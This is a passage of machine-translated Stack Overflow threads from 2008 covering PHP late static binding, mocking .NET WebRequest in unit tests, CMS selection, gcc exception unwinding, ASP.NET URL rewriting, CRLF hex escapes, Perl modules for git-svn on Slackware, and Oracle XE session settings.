*   [http://bugs.php.net/bug.php?id=42681](http://bugs.php.net/bug.php?id=42681)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-09-17T20:56:18.090

我对后期静态绑定的一个主要需求是一组静态实例创建方法。

这个[DateAndTime 类](http://harmoni.sourceforge.net/harmoniDoc/phpdoc/harmoni/primitives.chronology/DateAndTime.html)是我从 Smalltalk/Squeak 移植到 PHP 的年表库的一部分。使用静态实例创建方法可以创建具有各种参数类型的实例，同时在静态方法中保持参数检查，以便库的使用者无法获得不完全有效的实例。

后期静态绑定在这种情况下很有用，因此这些静态实例创建方法的实现可以确定调用最初针对的是哪个类。这是一个使用示例：

**使用 LSB：**

```
class DateAndTime {

    public static function now() {
        $class = static::myClass();
        $obj = new $class;
        $obj->setSeconds(time());
        return $obj;
    }

    public static function yesterday() {
        $class = static::myClass();
        $obj = new $class;
        $obj->setSeconds(time() - 86400);
        return $obj;
    }

    protected static function myClass () {
        return 'DateAndTime';
    }
}

class Timestamp extends DateAndTime {

    protected static function myClass () {
        return 'Timestamp';
    }
}

// Usage:
$date = DateAndTime::now();
$timestamp = Timestamp::now();

$date2 = DateAndTime::yesterday();
$timestamp2 = Timestamp::yesterday(); 
```

如果没有后期静态绑定，[在我当前的实现中]每个类都必须实现每个实例创建方法，如下例所示：

**没有 LSB：**

```
class DateAndTime {

    public static function now($class = 'DateAndTime') {
        $obj = new $class;
        $obj->setSeconds(time());
        return $obj;
    }

    public static function yesterday($class = 'DateAndTime') {
        $obj = new $class;
        $obj->setSeconds(time() - 86400);
        return $obj;
    }

}

class Timestamp extends DateAndTime {

    public static function now($class = 'Timestamp') {
        return self::now($class);
    }

     public static function yesterday($class = 'Timestamp') {
        return self::yesterday($class);
    }

} 
```

随着实例创建方法和类层次结构的数量增加，方法的重复成为真正的麻烦。LSB 减少了这种重复，并允许更清洁和更直接的实现。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-09-17T21:57:30.610

在以下情况下很有用：

1.  您的功能在类层次结构中有所不同，

2.  该功能在层次结构上具有相同的签名，并且

3.  （至关重要）您没有实例可以挂起该功能。

如果只获得#1 和#2，则使用普通的实例方法。所以亚历克斯的问题（见他对这个问题的回答）不需要 LSB。

一个典型的例子是对象创建，其中子类以不同的方式创建自己，但使用相同的参数。显然你没有实例可以调用，所以创建方法（也称为工厂方法）必须是静态的。但是您希望它的行为因子类而异，因此普通的静态方法是不正确的。有关示例，请参见 Adam Franco 的答案。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-09-17T20:42:58.777

如果您需要在子类中尚未重载的方法中访问重载的静态属性/方法 - 您需要后期静态绑定。一个简单的例子：[paste2.org](http://paste2.org/p/75229)

经典的例子是 Rails 的 ActiveRecord 类，如果你尝试在 PHP 中实现类似的东西，它看起来像这样：`class User extends ActiveRecord`然后尝试调用`User::find(1)`被调用的方法实际上是因为`ActiveRecord::find()`你没有重载- 但没有后期静态绑定该方法无法知道它是从哪个类调用的（在其中将始终指向），因此它无法为您获取您的用户对象。`find()``User``find()``ActiveRecord``self``ActiveRecord`

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-04-13T18:17:03.417

假设您在简化的对象关系映射器中有表示表（行实例）的类。您将有一个类“用户”和一个类“公司”，它们的实例代表各自表的行。用户和公司将继承一些基本抽象类，比如说“BaseObject”，它将有一些常见的方法，如 save()、delete()、validate() 等......

如果要存储有关验证和表定义的数据，最好的位置是在每个派生类中的静态变量中 - 因为每个 User 实例的验证和表定义都是相同的。

如果没有 LSB，BaseObject 中提到的 validate() 方法将不会引用 User 和 Company 中定义的静态变量，即使您是通过 User 的实例调用它。它将在 BaseObject 类中查找相同的静态变量，并且会引发错误。

这是我对 PHP 5.2.8 的体验 - LSB 将在 5.3 中引入

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-05-20T21:53:17.063

我有一个带有处理某些格式的静态方法的类。我有另一个类，它需要原始类的所有功能，除了它如何处理格式。

# xml - 从 WebRequest 中模拟 WebResponse

> ID：87200
> 
> 赞同：36
> 
> 时间：2008-09-17T20:21:04.133
> 
> 标签：xml, web-services, rest, webrequest, webresponse

我终于开始着手创建一些与 RESTful Web 界面一起使用的应用程序，但是，我担心每次按 F5 运行一系列测试时我都会敲击他们的服务器。

基本上，我需要获取一系列 Web 响应，以便测试我是否正确解析了不同的响应，而不是每次都访问他们的服务器，我想我可以这样做一次，保存 XML，然后在本地工作。

但是，我看不到如何“模拟”WebResponse，因为（AFAIK）它们只能由**WebRequest.GetResponse实例化**

你们怎么去嘲笑这种事情？你？我真的不喜欢我正在锤击他们的服务器这一事实：SI 不想*过多*地更改代码，但我希望有一种优雅的方式来做到这一点..

## 接受后更新

威尔的回答是我需要的一记耳光，我知道我错过了一个基本点！

*   创建一个接口，该接口将返回一个代表 XML 的代理对象。
*   实现接口两次，一次使用 WebRequest，另一次返回静态“响应”。
*   然后，接口实现要么根据响应实例化返回类型，要么实例化静态 XML。
*   然后，您可以在测试或生产时将所需的类传递给服务层。

敲完代码后，我将粘贴一些示例。

* * *

## 回答 #1

> 赞同：60
> 
> 时间：2009-10-18T21:50:01.580

我在想做完全相同的事情时发现了这个问题。无法在任何地方找到答案，但经过更多挖掘后发现 .Net Framework 已内置对此的支持。

您可以注册一个工厂对象，在使用该前缀（或 url）时将调用`WebRequest.RegisterPrefix`该对象。`WebRequest.Create`工厂对象必须实现`IWebRequestCreate`它有一个`Create`返回`WebRequest`. 在这里你可以返回你的 mock `WebRequest`。

我在 [http://blog.salamandersoft.co.uk/index.php/2009/10/how-to-mock-httpwebrequest-when-unit-testing/上放了一些示例代码](http://blog.salamandersoft.co.uk/index.php/2009/10/how-to-mock-httpwebrequest-when-unit-testing/)

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2012-06-04T14:08:44.277

这是一个不需要模拟的解决方案。您实现`WebRequest`:`IWebRequestCreate` `WebRequest`和. 的所有三个组件`WebResponse`。见下文。我的示例生成失败的请求（通过 throwing `WebException`），但应该能够对其进行调整以发送“真实”响应：

```
class WebRequestFailedCreate : IWebRequestCreate {
    HttpStatusCode status;
    String statusDescription;
    public WebRequestFailedCreate(HttpStatusCode hsc, String sd) {
        status = hsc;
        statusDescription = sd;
    }
    #region IWebRequestCreate Members
    public WebRequest Create(Uri uri) {
        return new WebRequestFailed(uri, status, statusDescription);
    }
    #endregion
}
class WebRequestFailed : WebRequest {
    HttpStatusCode status;
    String statusDescription;
    Uri itemUri;
    public WebRequestFailed(Uri uri, HttpStatusCode status, String statusDescription) {
        this.itemUri = uri;
        this.status = status;
        this.statusDescription = statusDescription;
    }
    WebException GetException() {
        SerializationInfo si = new SerializationInfo(typeof(HttpWebResponse), new System.Runtime.Serialization.FormatterConverter());
        StreamingContext sc = new StreamingContext();
        WebHeaderCollection headers = new WebHeaderCollection();
        si.AddValue("m_HttpResponseHeaders", headers);
        si.AddValue("m_Uri", itemUri);
        si.AddValue("m_Certificate", null);
        si.AddValue("m_Version", HttpVersion.Version11);
        si.AddValue("m_StatusCode", status);
        si.AddValue("m_ContentLength", 0);
        si.AddValue("m_Verb", "GET");
        si.AddValue("m_StatusDescription", statusDescription);
        si.AddValue("m_MediaType", null);
        WebResponseFailed wr = new WebResponseFailed(si, sc);
        Exception inner = new Exception(statusDescription);
        return new WebException("This request failed", inner, WebExceptionStatus.ProtocolError, wr);
    }
    public override WebResponse GetResponse() {
        throw GetException();
    }
    public override IAsyncResult BeginGetResponse(AsyncCallback callback, object state) {
        Task<WebResponse> f = Task<WebResponse>.Factory.StartNew (
            _ =>
            {
                throw GetException();
            },
            state
        );
        if (callback != null) f.ContinueWith((res) => callback(f));
        return f;
    }
    public override WebResponse EndGetResponse(IAsyncResult asyncResult) {
        return ((Task<WebResponse>)asyncResult).Result;
    }

}
class WebResponseFailed : HttpWebResponse {
    public WebResponseFailed(SerializationInfo serializationInfo, StreamingContext streamingContext)
        : base(serializationInfo, streamingContext) {
    }
} 
```

您必须创建一个`HttpWebResponse`子类，因为否则您无法创建子类。

棘手的部分（在`GetException()`方法中）是输入您无法覆盖的值，例如`StatusCode`，这就是我们最好的伙伴`SerializaionInfo`进来的地方！这是您提供无法覆盖的值的地方。显然，覆盖`HttpWebResponse`您能够完成的部分 (of )，以完成剩下的工作。

我是如何在所有这些`AddValue()`电话中获得“名字”的？从异常消息！轮流告诉我每个人都很好，直到我让它开心为止。

现在，编译器会抱怨“过时”，但这仍然有效，包括 .NET Framework 版本 4。

这是一个（通过）测试用例供参考：

```
 [TestMethod, ExpectedException(typeof(WebException))]
    public void WebRequestFailedThrowsWebException() {
        string TestURIProtocol = TestContext.TestName;
        var ResourcesBaseURL = TestURIProtocol + "://resources/";
        var ContainerBaseURL = ResourcesBaseURL + "container" + "/";
        WebRequest.RegisterPrefix(TestURIProtocol, new WebRequestFailedCreate(HttpStatusCode.InternalServerError, "This request failed on purpose."));
        WebRequest wr = WebRequest.Create(ContainerBaseURL);
        try {
            WebResponse wrsp = wr.GetResponse();
            using (wrsp) {
                Assert.Fail("WebRequest.GetResponse() Should not have succeeded.");
            }
        }
        catch (WebException we) {
            Assert.IsInstanceOfType(we.Response, typeof(HttpWebResponse));
            Assert.AreEqual(HttpStatusCode.InternalServerError, (we.Response as HttpWebResponse).StatusCode, "Status Code failed");
            throw we;
        }
    } 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-09-17T20:31:51.550

你不能。最好的办法是将它包装在一个代理对象中，然后模拟它。或者，您必须使用可以拦截无法模拟的类型的模拟框架，例如 TypeMock。但你说的是美元，那里。最好做一点包装。

* * *

显然你**可以**做一些额外的工作。在此处查看投票最高的答案。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2011-03-17T12:51:04.733

我之前发现了以下博客，它解释了使用 Microsoft Moles 的一个很好的方法。

[http://maraboustork.co.uk/index.php/2011/03/mocking-httpwebresponse-with-moles/](http://maraboustork.co.uk/index.php/2011/03/mocking-httpwebresponse-with-moles/)

简而言之，该解决方案建议以下内容：

```
 [TestMethod]
    [HostType("Moles")]
    [Description("Tests that the default scraper returns the correct result")]
    public void Scrape_KnownUrl_ReturnsExpectedValue()
    {
        var mockedWebResponse = new MHttpWebResponse();

        MHttpWebRequest.AllInstances.GetResponse = (x) =>
        {
            return mockedWebResponse;
        };

        mockedWebResponse.StatusCodeGet = () => { return HttpStatusCode.OK; };
        mockedWebResponse.ResponseUriGet = () => { return new Uri("http://www.google.co.uk/someRedirect.aspx"); };
        mockedWebResponse.ContentTypeGet = () => { return "testHttpResponse"; }; 

        var mockedResponse = "<html> \r\n" +
                             "  <head></head> \r\n" +
                             "  <body> \r\n" +
                             "     <h1>Hello World</h1> \r\n" +
                             "  </body> \r\n" +
                             "</html>";

        var s = new MemoryStream();
        var sw = new StreamWriter(s);

            sw.Write(mockedResponse);
            sw.Flush();

            s.Seek(0, SeekOrigin.Begin);

        mockedWebResponse.GetResponseStream = () => s;

        var scraper = new DefaultScraper();
        var retVal = scraper.Scrape("http://www.google.co.uk");

        Assert.AreEqual(mockedResponse, retVal.Content, "Should have returned the test html response");
        Assert.AreEqual("http://www.google.co.uk/someRedirect.aspx", retVal.FinalUrl, "The finalUrl does not correctly represent the redirection that took place.");
    } 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-04-01T22:33:23.497

这不是一个完美的解决方案，但它以前对我有用，值得特别注意简单性：

[HTTP模拟器](http://haacked.com/archive/2007/06/19/unit-tests-web-code-without-a-web-server-using-httpsimulator.aspx)

还有一个 typemock 示例记录在[typemock 论坛](http://www.typemock.com/community/viewtopic.php?p=2744&highlight=httprequest)中：

```
using System;
using System.IO;
using System.Net;
using NUnit.Framework;
using TypeMock;

namespace MockHttpWebRequest
{
  public class LibraryClass
  {
    public string GetGoogleHomePage()
    {
      HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://www.google.com");
      HttpWebResponse response = (HttpWebResponse)request.GetResponse();
      using (StreamReader reader = new StreamReader(response.GetResponseStream()))
      {
        return reader.ReadToEnd();
      }
    }
  }

  [TestFixture]
  [VerifyMocks]
  public class UnitTests
  {
    private Stream responseStream = null;
    private const string ExpectedResponseContent = "Content from mocked response.";

    [SetUp]
    public void SetUp()
    {
      System.Text.UTF8Encoding encoding = new System.Text.UTF8Encoding();
      byte[] contentAsBytes = encoding.GetBytes(ExpectedResponseContent);
      this.responseStream = new MemoryStream();
      this.responseStream.Write(contentAsBytes, 0, contentAsBytes.Length);
      this.responseStream.Position = 0;
    }

    [TearDown]
    public void TearDown()
    {
      if (responseStream != null)
      {
        responseStream.Dispose();
        responseStream = null;
      }
    }

    [Test(Description = "Mocks a web request using natural mocks.")]
    public void NaturalMocks()
    {
      HttpWebRequest mockRequest = RecorderManager.CreateMockedObject<HttpWebRequest>(Constructor.Mocked);
      HttpWebResponse mockResponse = RecorderManager.CreateMockedObject<HttpWebResponse>(Constructor.Mocked);
      using (RecordExpectations recorder = RecorderManager.StartRecording())
      {
        WebRequest.Create("http://www.google.com");
        recorder.CheckArguments();
        recorder.Return(mockRequest);

        mockRequest.GetResponse();
        recorder.Return(mockResponse);

        mockResponse.GetResponseStream();
        recorder.Return(this.responseStream);
      }

      LibraryClass testObject = new LibraryClass();
      string result = testObject.GetGoogleHomePage();
      Assert.AreEqual(ExpectedResponseContent, result);
    }

    [Test(Description = "Mocks a web request using reflective mocks.")]
    public void ReflectiveMocks()
    {
      Mock<HttpWebRequest> mockRequest = MockManager.Mock<HttpWebRequest>(Constructor.Mocked);
      MockObject<HttpWebResponse> mockResponse = MockManager.MockObject<HttpWebResponse>(Constructor.Mocked);
      mockResponse.ExpectAndReturn("GetResponseStream", this.responseStream);
      mockRequest.ExpectAndReturn("GetResponse", mockResponse.Object);

      LibraryClass testObject = new LibraryClass();
      string result = testObject.GetGoogleHomePage();
      Assert.AreEqual(ExpectedResponseContent, result);
    }
  }
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2022-02-23T10:49:45.287

您可以使用 NSubstitute，例如

```
 var httpWebResponse = Substitute.For<HttpWebResponse>();
        httpWebResponse.StatusCode.Returns(HttpStatusCode.NotFound);
        httpWebResponse.StatusDescription.Returns("Not Found"); 
```

# content-management-system - 如何为小型网站选择 CMS/Portal 解决方案？

> ID：87210
> 
> 赞同：3
> 
> 时间：2008-09-17T20:22:12.430
> 
> 标签：content-management-system, comparison, portal, evaluation

我目前维护 3 个网站，它们都围绕同一个概念展开。其中 2 个是 WinForms 应用程序，网站提供了一些基本细节和下载链接。第三个是查询数据的网络应用程序。我还有一个论坛（SMF/TinyPortal），一直作为三个站点的技术支持/新闻中心。下载流量不错，但我在支持论坛上没有得到很多点击

我想整合这三个实体，这样我就不必重复公告、将数据库更新上传到多个位置，并且还可以为网站提供统一的外观。

幸运的是，我的主机帐户同时支持 .NET 和 PHP，所以我一直在研究 Drupal、Graffiti、DotNetNuke、Joomla、Community Server 等。但是，我很难区分哪些功能包含、支持或不属于框架的一部分。

是否有人对这些项目（以及其他项目）有很好的评估，并且可以评估它们的功能/可扩展性/定制/等？我不一定要寻找“您最喜欢什么”，而更多的是功能集/目标最终用户类型评估。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-09-17T20:31:04.750

如果您想快速比较 CMS 的功能，请查看[CMS Matrix](http://www.cmsmatrix.org/) - 几乎所有已知的 cms 都在上面。

*编辑* 更准确地说，来自网站

> CMSMatrix 是 Internet 上排名第一的内容管理系统比较网站。它允许用户评估超过 135 个不同类别的 950 多个内容管理系统。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-09-17T20:45:22.187

如果您想立即启动并运行包含几个不错的功能，请选择 N2。此外，它确实针对可扩展性和干净的代码。

[http://www.n2cms.com](http://www.n2cms.com)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-09-17T20:46:38.580

[“开源 cms”](http://opensourcecms.com/)有很多，并且运行带有管理员登录的演示

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-09-17T20:29:54.410

点网核：

*   非常灵活
*   周围有很多社区
*   社区往往是相当技术性的，很难找到有用的最终用户支持
*   可能难以升级并保持当前版本可用
*   相当容易为基本模块编程
*   100 个可用模块（免费和付费）
*   文档可能很难找到并且细节很少
*   易于皮肤，因此您的网站可以具有统一的外观
*   提供 1000 种预制皮肤。

希望这符合您正在寻找的内容。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-09-17T21:50:10.270

我发现 CMS Matrix（参考：iAn）有时可能有点过时，但它绝对是一个很好的起点。开源 CMS 是一个很好的资源（参考：mrinject）。我倾向于你可以修补的东西 - 封闭源可能会让你陷入困境。

如果您正在研究 .NET，那么 MojoPortal 是另一种选择，umbracco 等也是如此。在 DNN 和其他这些上搜索此处。我发现 Drupal 更令人生畏。此外，它的论坛非常基础。Joomla 和 DNN 一样倾向于为加载项花钱，尽管两者都有免费赠品。显然，Joomla 的免费赠品质量参差不齐——我从来没有仔细研究过。

我认为 PHP 人群的选择是 Drupal - 如果您可以投入空间来学习它。Drupal 往往比最终用户更友好，所以如果你不是开发人员，它比 Joomla 更难掌握。显然它的代码库比 Joomla 更好。

浏览社区 - 您将在那里度过一些时间，因此请确保它们符合您的喜好。

如果该网站非常简单，那么 WordPress 可能就足够了，因为它有大量的插件，并且有很多免费的模板或

我已经在这条路上徘徊了一段时间了。我的建议是设置一些测试安装并将它们大致配置为具有您想要的东西，然后尝试使用和 - 重要的是 - 尝试破坏它。将它们一起安装在同一台服务器上也是测试相对速度差异的好方法。

试驾它们 - 这是判断哪一个适合您的唯一方法。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-09-17T20:27:08.783

开箱即用的 DotNetNuke 包含许多功能，内容管理、链接管理、文档列表模块、论坛模块和此类性质的项目。还有一个非常好的第三方模块和皮肤市场，用于获得真正实施完整解决方案所需的增强功能。

只需一点时间，DNN 就可以作为网站集合的良好基础。它还支持多门户系统，允许您在同一代码库中托管多个站点，这非常有用。

最好的部分是它是免费的！

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-09-17T20:29:27.250

正如您所提到的，有很多可用的选项，其中大多数都具有所有基本功能。如果您正在寻找一个简单的设置，大多数甚至可能对您想要实现的目标有点过分。您选择哪种 CMS，可能最好取决于您对 CMS 使用的编程语言的偏好。

对于我维护的一些网站，我使用了 Typo3 ( [http://www.typo3.com/](http://www.typo3.com/) )。*我*选择的原因是 Typo3 的灵活性，它有许多（很多！）插件，用于各种功能，并且能够自己开发插件。

高温下，

J。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-09-17T20:42:07.703

假设您要开源，重要的考虑因素是：

一个活跃且知识渊博的社区。<-- 你不想成为 10 年后唯一能够支持这个 CMS 的人。

定期和简单的更新技术。

你的技能组合。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2010-01-18T21:43:03.513

作为供应商，我发现 CMS 矩阵令人生畏。它基本上是每个 CMS 的列表，带有一些通用的评级和评论。在选择 CMS 之前，我会先确定一个模型，然后再研究可用的各种选项。

1.  Open Source...has lots of user generated support, but often requires the assistance of outside developers for software maintenance and add-on installation.
2.  Private installed solutions...can be easier to work with, but lock you in to one vendor for maintenance.
3.  SaaS Model...still locks in to one vendor, but all updates are included and initial costs are minimal.

# c++ - gcc 如何在 linux 上实现 C++ 异常的堆栈展开？

> ID：87220
> 
> 赞同：19
> 
> 时间：2008-09-17T20:23:42.490
> 
> 标签：c++, exception, gcc

gcc 如何在 linux 上实现 C++ 异常的堆栈展开？特别是，它如何知道展开框架时调用哪些析构函数（即，存储了什么样的信息以及存储在哪里）？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2010-12-22T03:59:47.773

[请参阅x86_64 ABI](http://www.x86-64.org/documentation/abi.pdf)的第 6.2 节。这详细说明了界面，但没有详细说明基础数据。这也独立于 C++，也可以用于其他目的。

gcc 发出的 ELF 二进制文件主要有两个部分用于异常处理。它们是`.eh_frame`和`.gcc_except_table`。

`.eh_frame`遵循 DWARF 格式（使用 gdb 时主要使用的调试格式）。`.debug_frame`它与编译时发出的部分具有完全相同的格式`-g`。本质上，它包含在调用堆栈更高的任何位置弹出回机器寄存器和堆栈状态所需的信息。有关这方面的更多信息，请参阅 dwarfstd.org 上的 Dwarf 标准。

`.gcc_except_table`包含有关异常处理“着陆区”处理程序位置的信息。这是必要的，以便知道何时停止展开。不幸的是，这部分没有很好的记录。我能够收集到的唯一信息片段来自 gcc 邮件列表。尤其看[这个帖子](http://gcc.gnu.org/ml/gcc-help/2010-09/msg00116.html)

剩下的信息就是实际代码解释在这些数据部分中找到的信息的内容。相关代码位于 libstdc++ 和 libgcc 中。我现在不记得哪些片段生活在哪个片段中。DWARF 调用帧信息的解释器可以在文件 gcc/unwind-dw.c 中的 gcc 源代码中找到

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-09-17T21:10:14.467

虽然这看起来适用于 Itanium，但大概 x86 的实现类似：[异常处理 ABI](http://mentorembedded.github.com/cxx-abi/abi-eh.html)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-09-17T22:24:56.130

目前可用的文档不多，但是基本系统是 GCC 将 try/catch 块转换为[函数调用](http://gcc.gnu.org/onlinedocs/gccint/Exception-handling-routines.html)，然后[链接到具有所需运行时支持的库中](http://codesynthesis.com/~boris/blog/2006/12/10/statically-linking-on-aix/)（[有关树构建代码](http://gcc.gnu.org/onlinedocs/gccint/GIMPLE-Exception-Handling.html)的文档包括语句“抛出异常是不直接在 GIMPLE 中表示，因为它是通过调用函数来实现的”）。

不幸的是，我不熟悉这些函数，也不能告诉你要看什么（除了 libgcc 的源代码——它包括异常处理运行时）。

有一个“[新手的异常处理](http://gcc.gnu.org/wiki/Dwarf2EHNewbiesHowto)”文档可用。

# .net - ASP.NET Url重写和构建页面链接

> ID：87221
> 
> 赞同：0
> 
> 时间：2008-09-17T20:23:54.050
> 
> 标签：.net, url-rewriting, friendly-url

[所以这篇文章](https://stackoverflow.com/questions/2262/aspnet-url-rewriting)讨论了如何在 ASP.NET 应用程序中实际实现 url 重写以获得“友好的 url”。这很完美，非常适合将用户发送到特定页面，但是有没有人知道在使用引用的工具之一时在代码中创建“友好”URL 的好解决方案？

例如，当存在重写规则时，将 asp.net 控件内的链接列为 ~/mypage.aspx?product=12 将是一个问题，因为您以两种不同的方式链接到内容。

我熟悉使用 DotNetNuke 和 FriendlyUrl，其中有一个“NavigateUrl”方法可以从重写器获取友好的 Url 代码，但我没有找到如何使用 UrlRewriting.net 或其他解决方案执行此操作的示例那里。

理想情况下，我希望能够得到这样的东西。

```
string friendlyUrl = GetFriendlyUrl("~/MyUnfriendlyPage.aspx?myid=13"); 
```

**编辑：**我正在寻找一个通用的解决方案，而不是我必须为我网站中的每个页面实现的东西，但可能是可以与相反方向的规则匹配的东西。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-09-17T20:28:03.337

请参阅[System.Web.Routing](http://www.codethinked.com/post/2008/08/20/Exploring-SystemWebRouting.aspx)

路由不同于重写。实现此技术确实需要对您的页面进行少量更改（即，任何访问查询字符串参数的代码都需要修改），但它允许您根据定义的路由生成链接。它由 ASP.NET MVC 使用，但可以在任何 ASP.NET 应用程序中使用。

路由是 .Net 3.5 SP1 的一部分

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-09-17T20:27:32.277

为每个页面创建一个带有方法的 UrlBuilder 类，如下所示：

```
public class UrlBuilder
{
    public static string BuildProductUrl(int id)
    {
        if (true) // replace with logic to determine if URL rewriting is enabled
        {
            return string.Format("~/Product/{0}", id);
        }
        else
        {
            return string.Format("~/product.aspx?id={0}", id);
        }
    }
} 
```

# c# - 在 C# 中使用十六进制表示 CRLF

> ID：87222
> 
> 赞同：22
> 
> 时间：2008-09-17T20:24:11.303
> 
> 标签：c#

如何在 C# 中使用十六进制表示 CRLF？

* * *

## 回答 #1

> 赞同：52
> 
> 时间：2008-09-17T20:32:01.410

由于没有人实际给出要求的答案，所以这里是：

```
 "\x0d\x0a" 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2015-01-08T19:38:56.920

行尾字符。

对于 DOS/Windows，它是

```
x0d x0a (\r\n) 
```

而对于 *NIX 它是

```
x0a (\n) 
```

*   dos2unix - 转换`x0d x0a`为`x0a`使其与 *NIX 兼容。
*   unix2dos - 转换`x0a`为`x0d x0a`使其与 DOS/Win 兼容。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-09-17T20:24:58.790

不知道为什么，但它是 0x0d，0x0a，又名“\r\n”。

# perl - 让 git-svn 在 Slackware 12.1 上工作

> ID：87224
> 
> 赞同：1
> 
> 时间：2008-09-17T20:24:46.013
> 
> 标签：perl, git-svn, slackware

它显然是一些 Perl 扩展。Perl 版本是 5.8.8。

我找到了Error.pm，但现在我正在寻找Core.pm。

在我们讨论的时候：你们如何搜索这些模块。我尝试了谷歌，但这并没有太大帮助。谢谢。

* * *

最后，在我构建完所有内容之后，运行：

```
./Build install 
```

给我：

```
Running make install-lib 
/bin/ginstall -c -d /usr/lib/perl5/site_perl/5.8.8/i486-linux-thread-multi/Alien/SVN --prefix=/usr
/bin/ginstall: unrecognized option `--prefix=/usr'
Try `/bin/ginstall --help' for more information.
make: *** [install-fsmod-lib] Error 1
installing libs failed at inc/My/SVN/Builder.pm line 165. 
```

看起来 Slackware 的“ginstall”真的没有那个选项。我想我现在要去谷歌一点，看看如何解决这个问题。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-09-17T21:17:45.200

```
Base class package "Module::Build" is empty.
    (Perhaps you need to 'use' the module which defines that package first.)
 at inc/My/SVN/Builder.pm line 5
BEGIN failed--compilation aborted at inc/My/SVN/Builder.pm line 5.
Compilation failed in require at Build.PL line 6.
BEGIN failed--compilation aborted at Build.PL line 6. 
```

是要求您安装[Module::Build](https://metacpan.org/pod/Module::Build)的一种（相当糟糕的）方式。

一旦你这样做了

```
perl Build.PL
./Build
./Build test
./Build install 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-09-17T21:02:20.057

> 你们如何搜索这些模块

[http://search.cpan.org/](http://search.cpan.org/)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-09-17T21:04:26.387

> 现在我正在寻找 Core.pm

那是 SVN::Core，这有点问题。尝试从 CPAN安装[Alien::SVN 。](https://metacpan.org/pod/Alien::SVN)这适用于我在笔记本电脑上新安装的 Slackware 12.0，但我还没有将它安装在我的工作站上。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-09-17T20:31:59.443

它应该是兼容的。[CPAN Tester 的矩阵](http://bbbike.radzeit.de/~slaven/cpantestersmatrix.cgi?dist=Error+0.17015)显示Perl 5.8.8 在任何平台上都没有失败。

根据[README](https://metacpan.org/source/SHLOMIF/Error-0.17022/README)，您可以通过以下方式安装它：

```
perl Makefile.pl
make
make test
make install 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-09-17T21:06:40.390

[https://metacpan.org/](https://metacpan.org/)是您第一个调用 Perl 模块的端口。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-09-17T22:25:24.380

我猜你是在 Slackware 上运行的，所以你想用 cpan 命令来安装任何 Perl 模块。它将为您引入所有依赖项。如果您是第一次运行它，它必须进行一些配置，但较新版本的 cpan 会询问您是否希望它自动配置它。

$ sudo cpan

cpan> 安装 Alien::SVN

此外，如果有 Slackware 的包管理应用程序，您应该首先尝试安装新的 Perl 模块。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-09-17T20:39:00.080

“似乎不兼容”是什么意思？您可以发布错误消息吗？

如果最新版本不起作用，您可以在“其他版本”下拉列表中选择旧版本并下载。

编辑：对于那些阅读这篇文章的人，作者更新了这个问题，所以我的回答似乎有点离题了:)

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-09-17T21:08:01.087

搜索的地方是[http://search.cpan.org](http://search.cpan.org)。

我设置了浏览器 (Firefox)，以便我可以在地址栏中键入“cpan foo”，它会在 CPAN 中搜索匹配“foo”的模块。您可以使用关键字书签或将关键字分配给搜索插件来执行此操作。

# database - 如何在 Oracle 10g XE 上编辑会话参数？

> ID：87230
> 
> 赞同：1
> 
> 时间：2008-09-17T20:25:05.717
> 
> 标签：database, oracle

默认为 49

如何编辑到更高？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-09-17T20:42:33.723

您将需要发出以下命令（以具有更改系统权限的用户身份连接，sys 将执行此操作）

更改系统设置会话= *numberofsessions*范围= spfile；

您是否遇到过 ORA-12516 或 ORA-12520 错误？如果是这样，增加进程数可能也是个好主意

改变系统设置进程=进程数范围=spfile *；*

IIRC 您需要在发出这些命令后反弹数据库。这个链接[http://www.oracle.com/technology/tech/php/pdf/underground-php-oracle-manual.pdf](http://www.oracle.com/technology/tech/php/pdf/underground-php-oracle-manual.pdf)有一些关于配置 XE 的好信息。当我使用 XE 遇到类似问题时，我查阅了它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2011-09-26T14:02:43.757

您可以检查连接限制以微调会话/进程限制：

[http://zhefeng.wordpress.com/2008/09/24/ora-12516-error-tnslistener-could-not-find-available-handler-with-matching-protocol-stack/](http://zhefeng.wordpress.com/2008/09/24/ora-12516-error-tnslistener-could-not-find-available-handler-with-matching-protocol-stack/) ?

Step1：查看进程限制。

从 gv$resource_limit 中选择 *；

Step2：将参数从 150（默认）增加到 300（或任何其他所需的数字）

sql>alter system set processes=300 范围=spfile;

Step3：重启数据库，让参数生效。

ps：查看链接了解更多信息。

# asp.net - 在 ASP.net Webforms 中，您如何检测某人按下了哪个文本框？

> ID：87245
> 
> 赞同：5
> 
> 时间：2008-09-17T20:26:20.720
> 
> 标签：asp.net, webforms

